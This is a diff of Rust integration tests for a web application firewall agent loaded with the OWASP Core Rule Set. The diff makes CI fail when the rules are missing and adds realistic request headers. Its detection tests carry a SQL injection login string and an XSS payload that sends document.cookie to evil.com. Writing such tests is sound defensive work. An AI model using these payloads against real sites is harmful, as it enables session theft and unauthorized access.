@@ -14,9 +14,18 @@ use zentinel_agent_protocol::{
     Decision, RequestBodyChunkEvent, RequestHeadersEvent, RequestMetadata,
 };
 
-/// Check if CRS is available
+/// Check if CRS is available.
+///
+/// Locally the tests skip without a checkout. On CI (`CI` is set) a missing
+/// checkout is an error: these tests skipped silently on every CI run, which
+/// hid that stock CRS could not even be loaded.
 fn crs_available() -> bool {
-    Path::new("testdata/crs/crs-setup.conf").exists() && Path::new("testdata/crs/rules").is_dir()
+    let present = Path::new("testdata/crs/crs-setup.conf").exists()
+        && Path::new("testdata/crs/rules").is_dir();
+    if !present && std::env::var_os("CI").is_some() {
+        panic!("CI is set but testdata/crs is missing: fetch the OWASP CRS first");
+    }
+    present
 }
 
 /// Get CRS rules paths
@@ -38,10 +47,7 @@ async fn start_crs_server(config: ModSecConfig) -> Option<(tempfile::TempDir, st
 
     let agent = match ModSecAgent::new(config) {
         Ok(agent) => agent,
-        Err(e) => {
-            eprintln!("Failed to create agent with CRS: {}", e);
-            return None;
-        }
+        Err(e) => panic!("Failed to create agent with CRS: {}", e),
     };
 
     let server = UdsAgentServerV2::new("test-modsec-crs", socket_path.clone(), Box::new(agent));
@@ -600,6 +606,11 @@ async fn test_crs_sqli_in_json_body() {
         "Content-Type".to_string(),
         vec!["application/json".to_string()],
     );
+    // A real request carries Host and Content-Length; without them CRS
+    // blocks at the header phase (920280, 920180) and the body is never sent.
+    let body = r#"{"username": "admin' OR '1'='1", "password": "test"}"#;
+    headers.insert("Host".to_string(), vec!["example.com".to_string()]);
+    headers.insert("Content-Length".to_string(), vec![body.len().to_string()]);
 
     let headers_event = make_request_headers("POST", "/api/login", headers);
     let _ = client
@@ -607,7 +618,6 @@ async fn test_crs_sqli_in_json_body() {
         .await
         .expect("Failed to send headers");
 
-    let body = r#"{"username": "admin' OR '1'='1", "password": "test"}"#;
     let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
     let response = client
         .send_request_body_chunk(&body_event.correlation_id, &body_event)
@@ -641,6 +651,11 @@ async fn test_crs_xss_in_form_body() {
         "Content-Type".to_string(),
         vec!["application/x-www-form-urlencoded".to_string()],
     );
+    // A real request carries Host and Content-Length; without them CRS
+    // blocks at the header phase (920280, 920180) and the body is never sent.
+    let body = "comment=<script>document.location='http://evil.com/?c='+document.cookie</script>";
+    headers.insert("Host".to_string(), vec!["example.com".to_string()]);
+    headers.insert("Content-Length".to_string(), vec![body.len().to_string()]);
 
     let headers_event = make_request_headers("POST", "/comment", headers);
     let _ = client
@@ -648,7 +663,6 @@ async fn test_crs_xss_in_form_body() {
         .await
         .expect("Failed to send headers");
 
-    let body = "comment=<script>document.location='http://evil.com/?c='+document.cookie</script>";
     let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
     let response = client
         .send_request_body_chunk(&body_event.correlation_id, &body_event)
@@ -686,6 +700,9 @@ async fn test_crs_clean_get_request() {
         vec!["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)".to_string()],
     );
     headers.insert("Accept".to_string(), vec!["text/html".to_string()]);
+    // Every request the proxy forwards carries Host; without it CRS 920280
+    // (critical) blocks the request on its own.
+    headers.insert("Host".to_string(), vec!["example.com".to_string()]);
 
     let event = make_request_headers("GET", "/api/users?page=1&limit=20", headers);
     let response = client
